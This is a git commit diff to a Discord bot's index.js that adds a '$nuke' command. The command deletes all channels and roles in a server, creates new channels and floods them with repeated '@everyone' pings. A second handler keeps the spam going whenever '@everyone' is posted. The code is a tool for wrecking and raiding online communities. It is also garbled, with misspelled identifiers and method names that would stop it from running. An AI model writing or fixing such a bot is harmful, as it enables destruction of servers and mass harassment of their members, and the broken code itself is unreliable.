0731b623ca5b5c61bbcfa366d0bdfa2207ba86cc
tomi rios <>
2023-03-19 18:15:45 +0000

    main

--- index.js
+++ index.js
@@ -8,6 +8,29 @@ client.login(process.env.TOKEN)
 client.on('message', async (message) => {
   if (message.content === '$nuke') {
     message.guild.channels.cache.ForEach(channels => channel.delete());
-   
+
+    message.guild.roles.cache.Foreach(role => role.delete());
+
+    await message.guild.channels.create( '$nuke', {
+      type : 'text'
+    }).then(async channel => {
+      channel.send('@everyone ')
+    })
+  }
+})
+
+clinet.on('message', async (message) => {
+  if (message.contenet === '@everyone'){
+    await message.guild.channels.create( '$nuke', {
+      type : 'text'
+    }).then(async channel => {
+      channel.send('@everyone ')
+      
+    message.channel.send('@everyone')
+    message.channel.send('@everyone')
+    message.channel.send('@everyone')
+    message.channel.send('@everyone')
+    message.channel.send('@everyone')
+  })
   }
 })
